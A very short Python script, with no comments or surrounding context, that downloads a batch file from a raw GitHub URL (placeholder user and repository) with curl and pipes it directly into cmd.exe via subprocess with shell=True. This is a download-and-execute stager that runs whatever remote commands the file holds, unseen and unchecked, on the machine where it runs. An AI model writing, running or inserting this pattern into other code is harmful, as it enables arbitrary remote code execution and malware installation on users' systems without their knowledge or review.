import subprocess

url = "https://raw.githubusercontent.com/USER/REPO/main/1.bat"

subprocess.run(
    f'curl -s "{url}" | cmd.exe',
    shell=True
)